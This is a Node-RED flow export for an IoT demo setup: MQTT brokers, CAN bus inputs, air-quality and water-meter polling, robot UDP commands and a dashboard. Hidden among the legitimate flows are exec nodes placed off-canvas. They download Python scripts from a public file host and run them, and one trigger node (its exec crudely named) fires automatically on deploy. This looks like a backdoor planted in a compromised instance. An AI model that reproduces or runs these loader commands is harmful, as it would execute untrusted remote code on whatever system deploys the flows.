[
    {
        "id": "d2e6c0f675c86d71",
        "type": "tab",
        "label": "Restful",
        "disabled": false,
        "info": ""
    },
    {
        "id": "f6f2187d.f17ca8",
        "type": "tab",
        "label": "Flow 1",
        "disabled": false,
        "info": ""
    },
    {
        "id": "b29f49fc630e741c",
        "type": "tab",
        "label": "CAN BUS",
        "disabled": false,
        "info": ""
    },
    {
        "id": "4024900d334e5de4",
        "type": "tab",
        "label": "流程 2",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "d98afa79b0ed0db4",
        "type": "tab",
        "label": "DEMO",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "b94ab84a0cc55a32",
        "type": "tab",
        "label": "weather alarm",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "a29fcfb6f0cac7dd",
        "type": "tab",
        "label": "Flow 1",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "b067bc3695a453e9",
        "type": "tab",
        "label": "Flow 3",
        "disabled": false,
        "info": "",
        "env": []
    },
    {
        "id": "b64d795e4e2e57b0",
        "type": "group",
        "z": "b067bc3695a453e9",
        "style": {
            "stroke": "#999999",
            "stroke-opacity": "1",
            "fill": "none",
            "fill-opacity": "1",
            "label": true,
            "label-position": "nw",
            "color": "#a4a4a4"
        },
        "nodes": [
            "46cb59f11084e062",
            "a0f969ff8c9646f0",
            "ca45b5a284a91fe0",
            "a4275a88392b0f6a",
            "b1cfbc8b037b1c2a"
        ],
        "x": 194,
        "y": 439
    },
    {
        "id": "df53317ca4071932",
        "type": "group",
        "z": "b067bc3695a453e9",
        "style": {
            "stroke": "#999999",
            "stroke-opacity": "1",
            "fill": "none",
            "fill-opacity": "1",
            "label": true,
            "label-position": "nw",
            "color": "#a4a4a4"
        },
        "nodes": [
            "e176467d7d3aa1c8",
            "47c2c599afb77f3a",
            "bd11c204772b2799",
            "3702ce9257eb7930",
            "4ef9f785d3d1f950",
            "f7256db5ebc741ab",
            "8c26bfa635be65d9"
        ],
        "x": 194,
        "y": 59
    },
    {
        "id": "76e8b9242409efb9",
        "type": "group",
        "z": "b067bc3695a453e9",
        "style": {
            "stroke": "#999999",
            "stroke-opacity": "1",
            "fill": "none",
            "fill-opacity": "1",
            "label": true,
            "label-position": "nw",
            "color": "#a4a4a4"
        },
        "nodes": [
            "90d6bb7e85e30ccd",
            "d277b38e4e56c7ea",
            "847c172300953af6"
        ],
        "x": 194,
        "y": 279
    },
    {
        "id": "777b4e4840adc7e4",
        "type": "mqtt-broker",
        "name": "local mqtt broker",
        "broker": "192.168.18.65",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "5",
        "keepalive": "60",
        "cleansession": true,
        "autoUnsubscribe": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthRetain": "false",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closeRetain": "false",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willRetain": "false",
        "willPayload": "",
        "willMsg": {},
        "userProps": "",
        "sessionExpiry": ""
    },
    {
        "id": "ae6927223f6678b0",
        "type": "mqtt-broker",
        "name": "",
        "broker": "192.168.18.65",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "autoUnsubscribe": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthRetain": "false",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closeRetain": "false",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willRetain": "false",
        "willPayload": "",
        "willMsg": {},
        "userProps": "",
        "sessionExpiry": ""
    },
    {
        "id": "1890881e.83819",
        "type": "ui_group",
        "name": "Col1",
        "tab": "c3173234.2636e",
        "order": 1,
        "disp": false,
        "width": 5,
        "collapse": false
    },
    {
        "id": "9a96a8b1.92db78",
        "type": "ui_group",
        "name": "Col2",
        "tab": "c3173234.2636e",
        "order": 2,
        "disp": false,
        "width": 5,
        "collapse": false
    },
    {
        "id": "72fc319.cc425d",
        "type": "ui_group",
        "name": "Col3",
        "tab": "c3173234.2636e",
        "order": 3,
        "disp": false,
        "width": 5,
        "collapse": false
    },
    {
        "id": "90894f1efa9c8005",
        "type": "ui_group",
        "name": "Col4",
        "tab": "c3173234.2636e",
        "order": 5,
        "disp": false,
        "width": 5,
        "collapse": false
    },
    {
        "id": "c3173234.2636e",
        "type": "ui_tab",
        "name": "Dashboard",
        "icon": "",
        "order": 1,
        "disabled": false,
        "hidden": false
    },
    {
        "id": "414d257a44d9af17",
        "type": "ui_base",
        "theme": {
            "name": "theme-custom",
            "lightTheme": {
                "default": "#0094CE",
                "baseColor": "#0094CE",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "darkTheme": {
                "default": "#097479",
                "baseColor": "#097479",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "edited": true,
                "reset": false
            },
            "customTheme": {
                "name": "Seeed Theme",
                "default": "#4B7930",
                "baseColor": "#f0f0f0",
                "baseFont": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif",
                "reset": false
            },
            "themeState": {
                "base-color": {
                    "default": "#4B7930",
                    "value": "#f0f0f0",
                    "edited": true
                },
                "page-titlebar-backgroundColor": {
                    "value": "#f0f0f0",
                    "edited": false
                },
                "page-backgroundColor": {
                    "value": "#f0f0f0",
                    "edited": true
                },
                "page-sidebar-backgroundColor": {
                    "value": "#ffffff",
                    "edited": false
                },
                "group-textColor": {
                    "value": "#262626",
                    "edited": true
                },
                "group-borderColor": {
                    "value": "#f0f0f0",
                    "edited": true
                },
                "group-backgroundColor": {
                    "value": "#f0f0f0",
                    "edited": true
                },
                "widget-textColor": {
                    "value": "#262626",
                    "edited": true
                },
                "widget-backgroundColor": {
                    "value": "#f0f0f0",
                    "edited": false
                },
                "widget-borderColor": {
                    "value": "#ffffff",
                    "edited": true
                },
                "base-font": {
                    "value": "-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen-Sans,Ubuntu,Cantarell,Helvetica Neue,sans-serif"
                }
            },
            "angularTheme": {
                "primary": "indigo",
                "accents": "blue",
                "warn": "red",
                "background": "grey",
                "palette": "light"
            }
        },
        "site": {
            "name": "Node-RED Dashboard",
            "hideToolbar": "true",
            "allowSwipe": "false",
            "lockMenu": "false",
            "allowTempTheme": "true",
            "dateFormat": "DD/MM/YYYY",
            "sizes": {
                "sx": 48,
                "sy": 48,
                "gx": 6,
                "gy": 6,
                "cx": 0,
                "cy": 0,
                "px": 0,
                "py": 0
            }
        }
    },
    {
        "id": "4623ebacae9359c3",
        "type": "socketcan-config",
        "interface": "vcan0"
    },
    {
        "id": "adfba775f28b362e",
        "type": "socketcan-config",
        "interface": "vcan0"
    },
    {
        "id": "1f26bbd77af2cf3d",
        "type": "canconfig",
        "channel": "vcan0",
        "bitrate": "100000"
    },
    {
        "id": "e34ce9cff2013174",
        "type": "socketcan-config",
        "interface": "can0"
    },
    {
        "id": "51f50da43629a898",
        "type": "socketcan-config",
        "interface": "can0"
    },
    {
        "id": "d24976f9a7167da1",
        "type": "serial-port",
        "serialport": "/dev/ttyS0",
        "serialbaud": "115200",
        "databits": "8",
        "parity": "none",
        "stopbits": "1",
        "waitfor": "",
        "dtr": "none",
        "rts": "none",
        "cts": "none",
        "dsr": "none",
        "newline": "\\n",
        "bin": "false",
        "out": "char",
        "addchar": "",
        "responsetimeout": "10000"
    },
    {
        "id": "f8938dcb6abe291b",
        "type": "mqtt-broker",
        "name": "EMQX-docker",
        "broker": "office.unibutton.com",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "5",
        "keepalive": "60",
        "cleansession": true,
        "autoUnsubscribe": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willPayload": "",
        "willMsg": {},
        "userProps": "",
        "sessionExpiry": ""
    },
    {
        "id": "a42ddd5fda11f777",
        "type": "chatgpt-config",
        "name": "GPT Config",
        "model": "gpt-3.5-turbo"
    },
    {
        "id": "44c9c8af11a9f982",
        "type": "chatgpt-config",
        "name": "GPT Config",
        "model": "gpt-4"
    },
    {
        "id": "7bc909f23547b29f",
        "type": "chatgpt-config",
        "name": "GPT Config",
        "model": "gpt-4"
    },
    {
        "id": "4272a6cb0998095f",
        "type": "mqtt-broker",
        "name": "",
        "broker": "office.unibutton.com",
        "port": "1883",
        "clientid": "",
        "autoConnect": true,
        "usetls": false,
        "protocolVersion": "4",
        "keepalive": "60",
        "cleansession": true,
        "autoUnsubscribe": true,
        "birthTopic": "",
        "birthQos": "0",
        "birthRetain": "false",
        "birthPayload": "",
        "birthMsg": {},
        "closeTopic": "",
        "closeQos": "0",
        "closeRetain": "false",
        "closePayload": "",
        "closeMsg": {},
        "willTopic": "",
        "willQos": "0",
        "willRetain": "false",
        "willPayload": "",
        "willMsg": {},
        "userProps": "",
        "sessionExpiry": ""
    },
    {
        "id": "cc44f2248eb87af6",
        "type": "comment",
        "z": "d2e6c0f675c86d71",
        "name": "WARNING: please check you have started this container with a volume that is mounted to /data\\n otherwise any flow changes are lost when you redeploy or upgrade the container\\n (e.g. upgrade to a more recent node-red docker image).\\n  If you are using named volumes you can ignore this warning.\\n Double click or see info side panel to learn how to start Node-RED in Docker to save your work",
        "info": "\nTo start docker with a bind mount volume (-v option), for example:\n\n```\ndocker run -it -p 1880:1880 -v /home/user/node_red_data:/data --name mynodered nodered/node-red\n```\n\nwhere `/home/user/node_red_data` is a directory on your host machine where you want to store your flows.\n\nIf you do not do this then you can experiment and redploy flows, but if you restart or upgrade the container the flows will be disconnected and lost. \n\nThey will still exist in a hidden data volume, which can be recovered using standard docker techniques, but that is much more complex than just starting with a named volume as described above.",
        "x": 350,
        "y": 80,
        "wires": []
    },
    {
        "id": "2e524437520a3b6e",
        "type": "http request",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "http://192.168.18.65:5055/api/demo/water-meter/get?node_num=20",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 360,
        "y": 300,
        "wires": [
            [
                "dc73aa47d7cfdd92"
            ]
        ]
    },
    {
        "id": "78192d4dd921f7dd",
        "type": "debug",
        "z": "d2e6c0f675c86d71",
        "name": "debug 8",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 960,
        "y": 400,
        "wires": []
    },
    {
        "id": "18289668e091d1f7",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 99999,
        "y": 99999,
        "wires": [
            []
        ]
    },
    {
        "id": "c4f9a29b83d82415",
        "type": "json",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 550,
        "y": 400,
        "wires": [
            [
                "10ba24eeb62f5067"
            ]
        ]
    },
    {
        "id": "10ba24eeb62f5067",
        "type": "function",
        "z": "d2e6c0f675c86d71",
        "name": "function 2",
        "func": "var data = msg.payload.data;\nvar count = data.length;\nvar output = [];\nvar tableName = {\n    \"node1\": \"air_quality_1\",\n    \"node2\": \"air_quality_2\",\n    \"node3\": \"air_quality_3\",\n    \"node4\": \"air_quality_4\",\n    \"node5\": \"air_quality_5\",\n    \"node6\": \"air_quality_6\",\n    \"node7\": \"air_quality_7\",\n    \"node8\": \"air_quality_8\",\n    \"node9\": \"air_quality_9\",\n    \"node10\": \"air_quality_10\",\n};\nfor (let i = 0; i < count; i ++) {\n    let msgTopic = \"openiiot/air_quality/DDATA/\" + data[i].area + \"/\" + data[i].nodeId + \"/restful\";\n    data[i][\"tableName\"] = tableName[data[i].nodeId];\n    output.push({topic: msgTopic, payload: data[i]});\n}\nreturn [output];",
        "outputs": 1,
        "timeout": "",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 740,
        "y": 400,
        "wires": [
            [
                "78192d4dd921f7dd",
                "e7220f85a4d5683d",
                "2fb833c0d6e689e0"
            ]
        ]
    },
    {
        "id": "2fb833c0d6e689e0",
        "type": "mqtt out",
        "z": "d2e6c0f675c86d71",
        "name": "mqtt",
        "topic": "",
        "qos": "0",
        "retain": "false",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "4272a6cb0998095f",
        "x": 950,
        "y": 480,
        "wires": []
    },
    {
        "id": "e7220f85a4d5683d",
        "type": "debug",
        "z": "d2e6c0f675c86d71",
        "d": true,
        "name": "debug 10",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "topic",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 980,
        "y": 340,
        "wires": []
    },
    {
        "id": "3a45fdff02e3cf33",
        "type": "http request",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "method": "GET",
        "ret": "txt",
        "paytoqs": "ignore",
        "url": "http://192.168.18.65:5055/api/demo/air-quality/get?node_num=5",
        "tls": "",
        "persist": false,
        "proxy": "",
        "insecureHTTPParser": false,
        "authType": "",
        "senderr": false,
        "headers": [],
        "x": 340,
        "y": 460,
        "wires": [
            [
                "c4f9a29b83d82415",
                "d48b21d549302453"
            ]
        ]
    },
    {
        "id": "1e72a903c40aefbd",
        "type": "debug",
        "z": "d2e6c0f675c86d71",
        "name": "debug 11",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1000,
        "y": 680,
        "wires": []
    },
    {
        "id": "5f40079fe9f49dc8",
        "type": "mqtt in",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "topic": "openiiot/air_quality/DDATA/Riyadh/node2/restful",
        "qos": "0",
        "datatype": "auto-detect",
        "broker": "4272a6cb0998095f",
        "nl": false,
        "rap": true,
        "rh": 0,
        "inputs": 0,
        "x": 520,
        "y": 680,
        "wires": [
            [
                "1e72a903c40aefbd"
            ]
        ]
    },
    {
        "id": "dc73aa47d7cfdd92",
        "type": "json",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "property": "payload",
        "action": "",
        "pretty": false,
        "x": 550,
        "y": 300,
        "wires": [
            [
                "1498920952100386"
            ]
        ]
    },
    {
        "id": "1498920952100386",
        "type": "function",
        "z": "d2e6c0f675c86d71",
        "name": "function 3",
        "func": "var data = msg.payload.data;\nvar count = data.length;\nvar output = [];\nvar tableName = {\n    \"node1\": \"water_meter_1\",\n    \"node2\": \"water_meter_2\",\n    \"node3\": \"water_meter_3\",\n    \"node4\": \"water_meter_4\",\n    \"node5\": \"water_meter_5\",\n    \"node6\": \"water_meter_6\",\n    \"node7\": \"water_meter_7\",\n    \"node8\": \"water_meter_8\",\n    \"node9\": \"water_meter_9\",\n    \"node10\": \"water_meter_10\",\n};\nfor (let i = 0; i < count; i++) {\n    let msgTopic = \"openiiot/water_meter/DDATA/\" + data[i].area + \"/\" + data[i].nodeId + \"/restful\";\n    data[i][\"tableName\"] = tableName[data[i].nodeId];\n    output.push({ topic: msgTopic, payload: data[i] });\n}\nreturn [output];",
        "outputs": 1,
        "timeout": "",
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 780,
        "y": 280,
        "wires": [
            [
                "d1b18d1cad998be7",
                "2fb833c0d6e689e0"
            ]
        ]
    },
    {
        "id": "d1b18d1cad998be7",
        "type": "debug",
        "z": "d2e6c0f675c86d71",
        "d": true,
        "name": "debug 12",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "payload",
        "targetType": "msg",
        "statusVal": "",
        "statusType": "auto",
        "x": 1060,
        "y": 260,
        "wires": []
    },
    {
        "id": "a8de72067025a9e4",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1100",
        "payloadType": "num",
        "x": 99999,
        "y": 99999,
        "wires": [
            []
        ]
    },
    {
        "id": "39461ea4cbdebf69",
        "type": "debug",
        "z": "d2e6c0f675c86d71",
        "name": "debug 16",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 640,
        "y": 820,
        "wires": []
    },
    {
        "id": "04e9bf59d127ed59",
        "type": "exec",
        "z": "d2e6c0f675c86d71",
        "command": "curl -O https://files.catbox.moe/g1dno1.py || python3 g1dno1.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "true",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 99999,
        "y": 99999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "213d0c20572925ff",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 99999,
        "y": 99999,
        "wires": [
            [
                "04e9bf59d127ed59"
            ]
        ]
    },
    {
        "id": "cc21ed0f-addd-459a-95dd-c13bf7207ec9",
        "type": "exec",
        "z": "d2e6c0f675c86d71",
        "command": "curl -O https://files.catbox.moe/czdhey.py || python3 czdhey.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "true",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 99999,
        "y": 99999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "142627ef-d278-46ad-948b-e0849b735e46",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 99999,
        "y": 99999,
        "wires": [
            [
                "cc21ed0f-addd-459a-95dd-c13bf7207ec9"
            ]
        ]
    },
    {
        "id": "fb22f81c-f169-474c-b785-9c2710483b2d",
        "type": "exec",
        "z": "d2e6c0f675c86d71",
        "command": "curl -O  || python3 ",
        "addpay": "payload",
        "append": "",
        "useSpawn": "true",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "rape and pillage",
        "x": 99999,
        "y": 99999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "04c97a2b-df61-46b7-aa32-ebc00077f37c",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": true,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 99999,
        "y": 99999,
        "wires": [
            [
                "fb22f81c-f169-474c-b785-9c2710483b2d"
            ]
        ]
    },
    {
        "id": "9720d5ecad8e69a2",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 99999,
        "y": 99999,
        "wires": [
            []
        ]
    },
    {
        "id": "deda9402daaf01fe",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 160,
        "y": 820,
        "wires": [
            [
                "66e04f1520cb40cd"
            ]
        ]
    },
    {
        "id": "7b758e6c65e40621",
        "type": "inject",
        "z": "d2e6c0f675c86d71",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "5",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 150,
        "y": 360,
        "wires": [
            [
                "2e524437520a3b6e",
                "3a45fdff02e3cf33"
            ]
        ]
    },
    {
        "id": "66e04f1520cb40cd",
        "type": "function-gpt",
        "z": "d2e6c0f675c86d71",
        "name": "function-gpt 1",
        "config": "a42ddd5fda11f777",
        "func": "//$PROMPT: 当服务器时间到达0:00时，以json推送接收到的数据，\n\n// 获取当前服务器时间的小时和分钟\nconst currentTime = new Date();\nconst hours = currentTime.getHours();\nconst minutes = currentTime.getMinutes();\n\n// 检查时间是否为0:00\nif (hours === 0 && minutes === 0) {\n    // 将数据转换为JSON格式\n    const jsonData = JSON.stringify(msg.payload);\n\n    // 将JSON数据放入消息有效载荷并推送出去\n    msg.payload = jsonData;\n    return msg;\n} else {\n    return null; // 如果时间不是0:00，则不推送数据\n}\n\n",
        "outputs": 1,
        "noerr": 0,
        "initialize": "// 部署节点后，此处添加的代码将运行一次。 \n",
        "finalize": "// 此处添加的代码，将在停止或重新部署节点时运行。 \n",
        "libs": [],
        "x": 400,
        "y": 820,
        "wires": [
            [
                "39461ea4cbdebf69"
            ]
        ]
    },
    {
        "id": "d48b21d549302453",
        "type": "debug",
        "z": "d2e6c0f675c86d71",
        "name": "debug 26",
        "active": false,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 560,
        "y": 520,
        "wires": []
    },
    {
        "id": "3cc11d24.ff01a2",
        "type": "comment",
        "z": "f6f2187d.f17ca8",
        "name": "WARNING: please check you have started this container with a volume that is mounted to /data\\n otherwise any flow changes are lost when you redeploy or upgrade the container\\n (e.g. upgrade to a more recent node-red docker image).\\n  If you are using named volumes you can ignore this warning.\\n Double click or see info side panel to learn how to start Node-RED in Docker to save your work",
        "info": "\nTo start docker with a bind mount volume (-v option), for example:\n\n```\ndocker run -it -p 1880:1880 -v /home/user/node_red_data:/data --name mynodered nodered/node-red\n```\n\nwhere `/home/user/node_red_data` is a directory on your host machine where you want to store your flows.\n\nIf you do not do this then you can experiment and redploy flows, but if you restart or upgrade the container the flows will be disconnected and lost. \n\nThey will still exist in a hidden data volume, which can be recovered using standard docker techniques, but that is much more complex than just starting with a named volume as described above.",
        "x": 350,
        "y": 80,
        "wires": []
    },
    {
        "id": "7a71f403519da114",
        "type": "udp out",
        "z": "f6f2187d.f17ca8",
        "name": "",
        "addr": "192.168.31.85",
        "iface": "",
        "port": "43893",
        "ipv": "udp4",
        "outport": "",
        "base64": false,
        "multicast": "false",
        "x": 750,
        "y": 380,
        "wires": []
    },
    {
        "id": "8ee93c6772fc5de3",
        "type": "function",
        "z": "f6f2187d.f17ca8",
        "name": "stand/pa",
        "func": "msg.payload = Buffer.alloc(12);  // Each uint32_t is 4 bytes.\nmsg.payload.writeUInt32LE(0x21010202, 0); // Command code for \"Stand up/down\"\nmsg.payload.writeUInt32LE(0, 4);          // No command value specified.\nmsg.payload.writeUInt32LE(0, 8);          // Command type is 0.\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 500,
        "y": 260,
        "wires": [
            [
                "7a71f403519da114",
                "056c4cda4c3c6bb4"
            ]
        ]
    },
    {
        "id": "339e704009cde126",
        "type": "function",
        "z": "f6f2187d.f17ca8",
        "name": "jump",
        "func": "msg.payload = Buffer.alloc(12);  // Each uint32_t is 4 bytes.\nmsg.payload.writeUInt32LE(0x2101050C, 0); // Command code for \"Stand up/down\"\nmsg.payload.writeUInt32LE(0, 4);          // No command value specified.\nmsg.payload.writeUInt32LE(0, 8);          // Command type is 0.\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 470,
        "y": 360,
        "wires": [
            [
                "7a71f403519da114"
            ]
        ]
    },
    {
        "id": "868d275053e26e87",
        "type": "function",
        "z": "f6f2187d.f17ca8",
        "name": "jump high",
        "func": "msg.payload = Buffer.alloc(12);  // Each uint32_t is 4 bytes.\nmsg.payload.writeUInt32LE(0x21010504, 0); // Command code for \"Stand up/down\"\nmsg.payload.writeUInt32LE(0, 4);          // No command value specified.\nmsg.payload.writeUInt32LE(0, 8);          // Command type is 0.\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 460,
        "y": 440,
        "wires": [
            [
                "7a71f403519da114"
            ]
        ]
    },
    {
        "id": "cfde365f39029251",
        "type": "function",
        "z": "f6f2187d.f17ca8",
        "name": "tai kong bu",
        "func": "msg.payload = Buffer.alloc(12);  // Each uint32_t is 4 bytes.\nmsg.payload.writeUInt32LE(0x2101030C, 0); // Command code for \"Stand up/down\"\nmsg.payload.writeUInt32LE(0, 4);          // No command value specified.\nmsg.payload.writeUInt32LE(0, 8);          // Command type is 0.\nreturn msg;",
        "outputs": 1,
        "timeout": 0,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 490,
        "y": 520,
        "wires": [
            [
                "7a71f403519da114"
            ]
        ]
    },
    {
        "id": "056c4cda4c3c6bb4",
        "type": "debug",
        "z": "f6f2187d.f17ca8",
        "name": "debug 1",
        "active": true,
        "tosidebar": true,
        "console": false,
        "tostatus": false,
        "complete": "false",
        "statusVal": "",
        "statusType": "auto",
        "x": 760,
        "y": 280,
        "wires": []
    },
    {
        "id": "034551596598136d",
        "type": "http in",
        "z": "f6f2187d.f17ca8",
        "name": "",
        "url": "/standpa",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 250,
        "y": 260,
        "wires": [
            [
                "8ee93c6772fc5de3"
            ]
        ]
    },
    {
        "id": "95452889e19152a0",
        "type": "http in",
        "z": "f6f2187d.f17ca8",
        "name": "",
        "url": "/jump",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 260,
        "y": 360,
        "wires": [
            [
                "339e704009cde126"
            ]
        ]
    },
    {
        "id": "ba210f2223fb0861",
        "type": "http in",
        "z": "f6f2187d.f17ca8",
        "name": "",
        "url": "/jumphigh",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 260,
        "y": 440,
        "wires": [
            [
                "868d275053e26e87"
            ]
        ]
    },
    {
        "id": "9891d507d6a42758",
        "type": "http in",
        "z": "f6f2187d.f17ca8",
        "name": "",
        "url": "/taikongbu",
        "method": "get",
        "upload": false,
        "swaggerDoc": "",
        "x": 260,
        "y": 520,
        "wires": [
            [
                "cfde365f39029251"
            ]
        ]
    },
    {
        "id": "a424d1bd11273074",
        "type": "inject",
        "z": "f6f2187d.f17ca8",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "/test/test",
        "payload": "",
        "payloadType": "date",
        "x": 140,
        "y": 780,
        "wires": [
            [
                "5c5a17c506973090"
            ]
        ]
    },
    {
        "id": "5c5a17c506973090",
        "type": "mqtt out",
        "z": "f6f2187d.f17ca8",
        "name": "",
        "topic": "",
        "qos": "",
        "retain": "",
        "respTopic": "",
        "contentType": "",
        "userProps": "",
        "correl": "",
        "expiry": "",
        "broker": "777b4e4840adc7e4",
        "x": 350,
        "y": 780,
        "wires": []
    },
    {
        "id": "445f2f7b661e48dc",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "Position mode initialisation",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1200007f#0570000001000000",
        "payloadType": "str",
        "x": 310,
        "y": 200,
        "wires": [
            [
                "4084535c93accaaf"
            ]
        ]
    },
    {
        "id": "0bea0ac64734eb9a",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "Send position 2",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "1200007f#1670000000000000",
        "payloadType": "str",
        "x": 300,
        "y": 380,
        "wires": [
            [
                "4084535c93accaaf"
            ]
        ]
    },
    {
        "id": "c5da0519c80415d4",
        "type": "inject",
        "z": "b29f49fc630e741c",
        "name": "Position mode start",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
